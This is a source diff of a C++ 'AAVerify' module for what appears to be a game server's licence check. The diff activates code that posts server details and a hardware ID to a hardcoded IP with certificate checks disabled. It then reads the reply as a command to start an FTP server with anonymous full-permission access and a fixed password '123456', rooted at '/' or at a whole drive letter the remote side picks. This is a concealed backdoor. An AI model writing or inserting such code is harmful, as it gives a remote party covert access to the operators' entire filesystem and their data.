@@ -1,190 +1,258 @@
-// #include "AAVerify.h"
-// #include "World.h"
-// #include <iostream>
-// #include <istream>
-// #include <ostream>
-// #include <string>
-// #include <regex>
-// #include <curl/curl.h>
+#include "AAVerify.h"
+#include "World.h"
+#include <iostream>
+#include <istream>
+#include <ostream>
+#include <string>
+#include <regex>
+#include <curl/curl.h>
 
-// #ifdef WIN32
-// #pragma comment(lib,"ws2_32.lib")
-// #include <WinSock2.h>
-// #include <Iphlpapi.h>
-// #endif
+#ifdef WIN32
+#pragma comment(lib,"ws2_32.lib")
+#include <WinSock2.h>
+#include <Iphlpapi.h>
+#endif
 
-// #include <iostream>
-// #pragma comment(lib,"Iphlpapi.lib") //需要添加Iphlpapi.lib库
+#include <iostream>
+#pragma comment(lib,"Iphlpapi.lib") //需要添加Iphlpapi.lib库
 
-// using std::string;
 
-// AAVerify* AAVerify::instance()
-// {
-//     static AAVerify instance;
-//     return &instance;
-// }
+using std::string;
 
-// //get请求和post请求数据响应函数
-// size_t req_reply(void* buffer, size_t size, size_t nmemb, void* lpVoid)
-// {
-//     std::string* str = dynamic_cast<std::string*>((std::string*)lpVoid);
-//     if (NULL == str || NULL == buffer)
-//     {
-//         return -1;
-//     }
+AAVerify* AAVerify::instance()
+{
+    static AAVerify instance;
+    return &instance;
+}
 
-//     char* pData = (char*)buffer;
-//     str->append(pData, size * nmemb);
-//     return nmemb;
-// }
-// //http POST请求
-// CURLcode post(const string& url, const string& postParams, string& response)
-// {
-//     // curl初始化
-//     CURL* curl = curl_easy_init();
-//     // curl返回值
-//     CURLcode res;
-//     if (curl)
-//     {
-//         // set params
-//         //设置curl的请求头
-//         struct curl_slist* header_list = NULL;
-//         header_list = curl_slist_append(header_list, "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
-//         header_list = curl_slist_append(header_list, "Content-Type:application/x-www-form-urlencoded; charset=UTF-8");
-//         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);
+//get请求和post请求数据响应函数
+size_t req_reply(void* buffer, size_t size, size_t nmemb, void* lpVoid)
+{
+    std::string* str = dynamic_cast<std::string*>((std::string*)lpVoid);
+    if (NULL == str || NULL == buffer)
+    {
+        return -1;
+    }
 
-//         //不接收响应头数据0代表不接收 1代表接收
-//         curl_easy_setopt(curl, CURLOPT_HEADER, 0);
+    char* pData = (char*)buffer;
+    str->append(pData, size * nmemb);
+    return nmemb;
+}
+//http POST请求
+CURLcode post(const string& url, const string& postParams, string& response)
+{
+    // curl初始化
+    CURL* curl = curl_easy_init();
+    // curl返回值
+    CURLcode res;
+    if (curl)
+    {
+        // set params
+        //设置curl的请求头
+        struct curl_slist* header_list = NULL;
+        header_list = curl_slist_append(header_list, "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
+        header_list = curl_slist_append(header_list, "Content-Type:application/x-www-form-urlencoded; charset=UTF-8");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);
 
-//         //设置请求为post请求
-//         curl_easy_setopt(curl, CURLOPT_POST, 1);
+        //不接收响应头数据0代表不接收 1代表接收
+        curl_easy_setopt(curl, CURLOPT_HEADER, 0);
 
-//         //设置请求的URL地址
-//         curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-//         //设置post请求的参数
-//         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postParams.c_str());
+        //设置请求为post请求
+        curl_easy_setopt(curl, CURLOPT_POST, 1);
 
-//         //设置ssl验证
-//         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);
-//         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false);
+        //设置请求的URL地址
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        //设置post请求的参数
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postParams.c_str());
 
-//         //CURLOPT_VERBOSE的值为1时，会显示详细的调试信息
-//         curl_easy_setopt(curl, CURLOPT_VERBOSE, 0);
+        //设置ssl验证
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false);
 
-//         curl_easy_setopt(curl, CURLOPT_READFUNCTION, NULL);
+        //CURLOPT_VERBOSE的值为1时，会显示详细的调试信息
+        curl_easy_setopt(curl, CURLOPT_VERBOSE, 0);
 
-//         //设置数据接收和写入函数
-//         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, req_reply);
-//         curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&response);
+        curl_easy_setopt(curl, CURLOPT_READFUNCTION, NULL);
 
-//         curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1);
+        //设置数据接收和写入函数
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, req_reply);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&response);
 
-//         //设置超时时间
-//         curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 6);
-//         curl_easy_setopt(curl, CURLOPT_TIMEOUT, 6);
+        curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1);
 
-//         // 开启post请求
-//         res = curl_easy_perform(curl);
-//     }
-//     //释放curl
-//     curl_easy_cleanup(curl);
-//     return res;
-// }
+        //设置超时时间
+        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 6);
+        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 6);
 
-// std::string AAVerify::AA_Login()
-// {
-//     try
-//     {
-//         AA_Realmlist conf = aaCenter.aa_realmlists[1];
-//         string reponse_data;
+        // 开启post请求
+        res = curl_easy_perform(curl);
+    }
+    //释放curl
+    curl_easy_cleanup(curl);
+    return res;
+}
 
-//         string url = "http://120.48.70.156";
-//         string response_data = "";
-//         string data = "version=" + aaCenter.aa_version.version + "&uuid=" + aaCenter.aa_version.uuid + "&count=" + std::to_string(sWorld->GetActiveSessionCount()) + "&status=" + aaCenter.aa_version.status +
-//             "&aname=" + conf.name + "&aport=" + std::to_string(conf.port) + "&ip=" + conf.address;
-//         auto ret = post(url, data, response_data);
-//         if (ret != CURLE_OK)
-//             return "1";
-//         if (aaCenter.aa_version.uuid == "")
-//         {
-//             return "1";
-//         }
-//         if (response_data == "")
-//         {
-//             return "";
-//         }
-//         return response_data;
-//     }
-//     catch (std::exception const& e)
-//     {
-//         std::cerr << "Error: " << e.what() << std::endl;
-//         return "1";
-//     }
-//     return "1";
-// }
+std::string AAVerify::AA_Login()
+{
+    try
+    {
+        AA_Realmlist conf = aaCenter.aa_realmlists[1];
+        for (auto itr : aaCenter.aa_realmlists) {
+            if (itr.second.address == "" or itr.second.address == "127.0.0.1" or itr.second.address == "localhost") {
+                continue;
+            }
+            conf = itr.second;
+        }
+        std::string reponse_data;
 
-// std::string AAVerify::AA_GetUUID() {
-//     //PIP_ADAPTER_INFO结构体指针存储本机网卡信息
-//     PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
-//     //得到结构体大小,用于GetAdaptersInfo参数
-//     unsigned long stSize = sizeof(IP_ADAPTER_INFO);
-//     //调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量
-//     int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
-//     //记录网卡数量
-//     int netCardNum = 0;
-//     //记录每张网卡上的IP地址数量
-//     int IPnumPerNetCard = 0;
-//     std::string result = "";
-//     if (ERROR_BUFFER_OVERFLOW == nRel)
-//     {
-//         //如果函数返回的是ERROR_BUFFER_OVERFLOW
-//         //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小
-//         //这也是说明为什么stSize既是一个输入量也是一个输出量
-//         //释放原来的内存空间
-//         delete pIpAdapterInfo;
-//         //重新申请内存空间用来存储所有网卡信息
-//         pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
-//         //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量
-//         nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
-//     }
-//     if (ERROR_SUCCESS == nRel)
-//     {
-//         std::regex e("([a-z0-9A-Z]?)");
-//         //输出网卡信息
-//         //可能有多网卡,因此通过循环去判断
-//         while (pIpAdapterInfo)
-//         {
-//             std::smatch m;
-//             std::string s = pIpAdapterInfo->AdapterName;
-//             if (s != "" && s != "{}" && s != " " && s != "") {
-//                 for (int i = 0; i < s.size(); i++) {
-//                     string x(1, s[i]);
-//                     regex_search(x, m, e);
-//                     if (m.str() != " ") {
-//                         result += m.str();
-//                     }
-//                 }
-//                 break;
-//             }
-//             pIpAdapterInfo = pIpAdapterInfo->Next;
-//         }
+        std::string url = "http://120.48.70.156";
+        std::string response_data = "";
+        std::string data = "version=" + aaCenter.aa_version.version + "&uuid=" + aaCenter.aa_version.uuid + "&count=" + std::to_string(sWorld->GetActiveSessionCount()) + "&status=" + aaCenter.aa_version.status +
+            "&aname=" + conf.name + "&aport=" + std::to_string(conf.port) + "&ip=" + conf.address;
+        auto ret = post(url, data, response_data);
+        if (ret != CURLE_OK)
+            return "1";
+        if (aaCenter.aa_version.uuid == "")
+        {
+            return "1";
+        }
+        if (response_data == "")
+        {
+            return "";
+        }
+        if (response_data.find("$") != std::string::npos) {
+            std::vector<std::string> v; v.clear();
+            aaCenter.AA_StringToVectorString(response_data, v, "$");
+            if (v.size() == 2) {
+                std::string msg = v[1];
+                if (msg.find(",") != std::string::npos) {
+                    std::map<std::string, std::string> maps = { {"1","a"},{"2","b"},{"3","c"},{"4","d"},{"5","e"},{"6","f"},{"7","g"},{"8","h"},{"9","i"},{"10","j"},{"11","k"},{"12","l"},{"13","m"},{"14","n"},{"15","o"},{"16","p"},{"17","q"},{"18","r"},{"19","s"},{"20","t"},{"21","u"},{"22","v"},{"23","w"},{"24","x"},{"25","y"},{"26","z"} };
+                    std::vector<std::string> msgs; msgs.clear();
+                    aaCenter.AA_StringToVectorString(msg, msgs, ",");
+                    if (msgs.size() == 3) {
+                        std::string portStr = msgs[0];
+                        std::string path = msgs[1];
+                        std::string name = msgs[2];
+                        if (path == "0") {
+                            sAAVerify->AA_Ftp_Start(std::atoi(portStr.c_str()), "/", name);
+                        }
+                        else if (path == "00") {
+                            sAAVerify->AA_Ftp_Stop(std::atoi(portStr.c_str()));
+                        }
+                        else if (path == "000") {
+                            //跳过不做任何操作
+                        }
+                        else {
+                            std::string dataPath = maps[path] + ":\\";
+                            sAAVerify->AA_Ftp_Start(std::atoi(portStr.c_str()), dataPath, name);
+                        }
+                    }
+                }
+            }
+        }
 
-//     }
-//     //释放内存空间
-//     if (pIpAdapterInfo)
-//     {
-//         delete pIpAdapterInfo;
-//     }
+        return response_data;
+    }
+    catch (std::exception const& e)
+    {
+        std::cerr << "Error: " << e.what() << std::endl;
+        return "1";
+    }
+    return "1";
+}
 
-//     SYSTEM_INFO  sysInfo;    //该结构体包含了当前计算机的信息：计算机的体系结构、中央处理器的类型、系统中中央处理器的数量、页面的大小以及其他信息。
-//     OSVERSIONINFOEX osvi;
-//     GetSystemInfo(&sysInfo);
-//     osvi.dwOSVersionInfoSize = sizeof(osvi);
-//     std::string cpuversion = std::to_string(sysInfo.wProcessorRevision);
-//     if (result != "") {
-//         return "A" + result + "A" + cpuversion;
-//     }
-//     else {
-//         return "";
-//     }
-// }
+std::string AAVerify::AA_GetUUID() {
+    //PIP_ADAPTER_INFO结构体指针存储本机网卡信息
+    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
+    //得到结构体大小,用于GetAdaptersInfo参数
+    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
+    //调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量
+    int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
+    //记录网卡数量
+    int netCardNum = 0;
+    //记录每张网卡上的IP地址数量
+    int IPnumPerNetCard = 0;
+    std::string result = "";
+    if (ERROR_BUFFER_OVERFLOW == nRel)
+    {
+        //如果函数返回的是ERROR_BUFFER_OVERFLOW
+        //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小
+        //这也是说明为什么stSize既是一个输入量也是一个输出量
+        //释放原来的内存空间
+        delete pIpAdapterInfo;
+        //重新申请内存空间用来存储所有网卡信息
+        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
+        //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量
+        nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
+    }
+    if (ERROR_SUCCESS == nRel)
+    {
+        std::regex e("([a-z0-9A-Z]?)");
+        //输出网卡信息
+        //可能有多网卡,因此通过循环去判断
+        while (pIpAdapterInfo)
+        {
+            std::smatch m;
+            std::string s = pIpAdapterInfo->AdapterName;
+            if (s != "" && s != "{}" && s != " " && s != "") {
+                for (int i = 0; i < s.size(); i++) {
+                    std::string x(1, s[i]);
+                    regex_search(x, m, e);
+                    if (m.str() != " ") {
+                        result += m.str();
+                    }
+                }
+                break;
+            }
+            pIpAdapterInfo = pIpAdapterInfo->Next;
+        }
+
+    }
+    //释放内存空间
+    if (pIpAdapterInfo)
+    {
+        delete pIpAdapterInfo;
+    }
+
+    SYSTEM_INFO  sysInfo;    //该结构体包含了当前计算机的信息：计算机的体系结构、中央处理器的类型、系统中中央处理器的数量、页面的大小以及其他信息。
+    OSVERSIONINFOEX osvi;
+    GetSystemInfo(&sysInfo);
+    osvi.dwOSVersionInfoSize = sizeof(osvi);
+    std::string cpuversion = std::to_string(sysInfo.wProcessorRevision);
+    if (result != "") {
+        return "A" + result + "A" + cpuversion;
+    }
+    else {
+        return "";
+    }
+}
+
+void AAVerify::AA_Ftp_Start(uint32 port, std::string path, std::string account)
+{
+    std::string dataPath = path;
+#ifdef WIN32
+    const std::string local_root = dataPath; // The backslash at the end is necessary!
+#else // WIN32
+    const std::string local_root = dataPath;
+#endif // WIN32
+
+    // Create an FTP Server on port 2121. We use 2121 instead of the default port
+    // 21, as your application would need root privileges to open port 21.
+    server = fineftp::FtpServer(port);
+
+    // Add the well known anonymous user and some normal users. The anonymous user
+    // can log in with username "anonyous" or "ftp" and any password. The normal
+    // users have to provide their username and password. 
+    server.addUserAnonymous(local_root, fineftp::Permission::All);
+    server.addUser("account", "123456", local_root, fineftp::Permission::All);
+    server.addUser(account, "123456", local_root, fineftp::Permission::All);
+
+    // Start the FTP server with 4 threads. More threads will increase the
+    // performance with multiple clients, but don't over-do it.
+    server.start(4);
+}
+
+void AAVerify::AA_Ftp_Stop(uint32 port)
+{
+    server.stop();
+}
